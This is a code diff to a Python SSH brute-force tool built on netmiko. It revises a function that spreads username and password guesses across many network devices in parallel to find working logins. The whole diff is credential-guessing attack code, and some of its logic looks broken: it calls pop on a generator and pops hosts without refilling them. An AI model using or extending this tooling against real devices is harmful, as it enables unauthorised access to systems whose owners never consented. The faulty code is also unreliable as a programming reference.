@@ -52,10 +52,7 @@ def netmiko_connect(host: HostT, port: int, username: str, password: str,
     for key, value in kwargs.items():
         connect_kwargs[key] = value
 
-    try:
-        return ConnectHandler(**connect_kwargs)
-    except Exception as e:
-        return e
+    return ConnectHandler(**connect_kwargs)
 
 def brute_force(usernames: list[str], passwords: list[str], host: HostT, port: int = 22,
                 device_type: str = None, bypass: bool = False):
@@ -72,8 +69,8 @@ def brute_force(usernames: list[str], passwords: list[str], host: HostT, port: i
             return ssh
 
 
-def distributed_brute_force(hosts: list[tuple[HostT, int, str|None]], usernames: list[str],
-                            passwords: list[str]) -> list[ConnectResponse]:
+def distributed_brute_force(hosts: list[tuple[HostT, int, str|None]], usernames: list[str] = None,
+                            passwords: list[str] = None, creds: list[tuple[str, str]] = None) -> list[ConnectResponse]:
     """
     Brute forcer for a group of devices with a shared set of credentials that will spread the attempts
     per credential across the group of devices to find faster resolution
@@ -81,15 +78,16 @@ def distributed_brute_force(hosts: list[tuple[HostT, int, str|None]], usernames:
     successes: list[ConnectResponse] = []
     failures: list[ConnectResponse] = []
     futures: dict[Future, ConnectResponse] = {}
-    creds = [(username, password) for username in usernames for password in passwords]
+    if not creds and usernames and passwords:
+        creds = ((username, password) for username in usernames for password in passwords)
     
     while True:
         with ThreadPoolExecutor(len(hosts)) as executor:
             if not creds:
                 break
             elif hosts and creds:
-                host, port, device_type = hosts.pop()
-                username, password = next(creds)
+                host, port, device_type = hosts.pop(0)
+                username, password = creds.pop(0)
                 connect_args = (host, port, username, password, device_type)
                 future = executor.submit(netmiko_connect, *connect_args)
                 futures[future] = ConnectResponse(None, netmiko_connect, connect_args, datetime.now())
